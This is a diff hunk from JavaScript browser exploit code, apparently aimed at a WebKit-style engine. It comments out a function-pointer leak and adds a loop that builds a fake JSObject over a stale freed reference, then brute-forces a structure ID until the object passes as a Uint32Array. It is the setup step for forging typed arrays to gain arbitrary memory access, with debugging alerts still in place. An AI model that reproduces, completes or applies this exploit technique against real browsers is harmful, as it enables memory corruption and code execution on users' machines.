@@ -201,9 +201,26 @@ function dgc() {
 				//alert("Found the object!!");
 				
  				// Leak function pointer
-				stale[0] = fc;
- 				fcp = bufs[i][k];
+				//stale[0] = fc;
+ 				//fcp = bufs[i][k];
 				//alert("Leaked function pointer:" + fcp)
+				
+				structID = 100;
+				stale[0] = {
+				    'a': u2d(structID, 0), // the JSObject properties
+				    'b': u2d(0, 0),
+				    'c': smsh, // var smsh = new Uint32Array(0x10)
+				    'd': u2d(0x100, 0)
+				}
+				stale[1] = stale[0];
+				bufs[i][k] += 0x10;
+				while(!(stale[0] instanceof Uint32Array)) {
+				    structID++;
+				    stale[1]['a'] = u2d(structID, 0);
+				    //alert(structID);
+				}
+				alert('found structID for Uint32Array = '+structID);
+				alert('stale[0] is now: '+stale[0]);
 				
 				// Make a fake Uint32Array
  				stale[0] = {
